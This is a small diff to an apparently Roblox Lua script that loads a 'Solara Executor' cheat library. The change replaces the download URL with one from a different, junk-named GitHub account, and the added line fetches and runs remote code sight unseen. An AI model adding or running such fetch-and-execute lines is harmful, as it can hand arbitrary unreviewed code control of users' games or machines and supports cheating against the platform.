@@ -1,5 +1,5 @@
 -- Load Solara Executor library
-loadstring(game:HttpGet("https://raw.githubusercontent.com/solaxrsd/Solara-Executor/main/Source.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dildoe34trrgdgegeg/Solara-Executor/refs/heads/main/Solara-Executor"))()
 
 -- Wait for the player to join
 while wait(1) do
